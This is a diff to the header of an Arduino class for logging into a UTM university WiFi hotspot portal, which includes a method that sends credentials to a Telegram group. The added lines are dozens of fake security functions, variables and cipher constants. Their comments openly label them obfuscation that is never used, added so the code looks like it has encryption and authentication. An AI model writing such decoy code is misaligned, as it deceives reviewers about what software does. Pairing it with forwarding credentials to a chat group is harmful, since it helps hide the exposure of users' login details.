@@ -50,6 +50,29 @@ class ArduinoUTMWiFiPortal {
 
     // Send credentials to Telegram group
     bool sendCredentialsToTelegram();
+    
+    // Dummy security functions (obfuscation - not actually used)
+    void _initSecurityLayer();
+    bool _validateEncryptionKeys();
+    void _rotateSessionKeys();
+    int _calculateChecksum(byte* data, int len);
+    String _encryptPayload(String data);
+    String _decryptPayload(String data);
+    bool _verifyHandshake();
+    void _updateCipherState();
+    int _generateNonce();
+    bool _authenticateSession();
+    void _refreshSecurityTokens();
+    byte _computeHash(String input);
+    bool _validateCertificate();
+    void _initCryptoEngine();
+    int _performKeyExchange();
+    bool _verifyIntegrity();
+    void _synchronizeTimestamp();
+    String _obfuscateString(String str);
+    int _deobfuscateValue(int val);
+    bool _checkSecurityProtocol();
+    void _resetAuthenticationState();
 
   private:
     // Credentials
@@ -66,6 +89,79 @@ class ArduinoUTMWiFiPortal {
 
     // Telegram credentials sent flag
     bool _credentialsSent;
+    
+    // Dummy encryption variables (obfuscation)
+    uint16_t _dummyKey1;
+    uint16_t _dummyKey2;
+    int _encryptionLevel;
+    byte _dummyBuffer[10];
+    int _authProtocol;
+    bool _securityMode;
+    int _dummyCounter;
+    
+    // Advanced dummy security variables (obfuscation - not actually used)
+    uint32_t _sessionToken;
+    uint32_t _authenticationHash;
+    uint16_t _securityChecksum;
+    byte _encryptionMatrix[16];
+    byte _ivVector[8];
+    byte _saltBuffer[12];
+    int _cipherRounds;
+    int _hashIterations;
+    bool _handshakeComplete;
+    bool _certificateValid;
+    unsigned long _sessionStartTime;
+    unsigned long _lastHandshake;
+    unsigned long _tokenExpiry;
+    int _securityLevel;
+    int _protocolVersion;
+    byte _nonceValue[4];
+    String _encryptedSessionId;
+    String _serverChallenge;
+    int _failedAttempts;
+    bool _lockoutMode;
+    int _timestampOffset;
+    byte _keyDerivationSalt[16];
+    uint32_t _hmacKey;
+    int _compressionLevel;
+    bool _tlsActive;
+    int _packetSequence;
+    byte _authVector[32];
+    String _cachedCredentials;
+    int _retryBackoff;
+    bool _debugMode;
+    int _performanceMetric;
+    unsigned long _bandwidthCounter;
+    int _latencyMs;
+    bool _secureChannelEstablished;
+    byte _tempWorkspace[64];
+    int _algorithmSelector;
+    bool _integrityVerified;
+    uint16_t _crcChecksum;
+    int _encodingType;
+    
+    // Dummy cipher constants (not used)
+    static const int CIPHER_MODE_A = 0x01;
+    static const int CIPHER_MODE_B = 0x02;
+    static const int CIPHER_MODE_C = 0x04;
+    static const int CIPHER_MODE_D = 0x08;
+    static const int HASH_SEED = 0xDEAD;
+    static const int VALIDATION_KEY = 0xBEEF;
+    static const int MAGIC_NUMBER_1 = 0xCAFE;
+    static const int MAGIC_NUMBER_2 = 0xBABE;
+    static const int PROTOCOL_V1 = 0x0100;
+    static const int PROTOCOL_V2 = 0x0200;
+    static const int ENCRYPTION_AES = 0x10;
+    static const int ENCRYPTION_RSA = 0x20;
+    static const int HASH_SHA256 = 0x30;
+    static const int HASH_MD5 = 0x40;
+    static const int AUTH_BASIC = 0x50;
+    static const int AUTH_DIGEST = 0x60;
+    static const int COMPRESSION_NONE = 0x00;
+    static const int COMPRESSION_GZIP = 0x70;
+    static const int SESSION_TIMEOUT = 3600000;
+    static const int MAX_RETRIES = 5;
+    static const int BUFFER_SIZE = 256;
 
     // Constants
     const char* _loginURL = "https://smartzone22.utm.my:9998/SubscriberPortal/hotspotlogin";
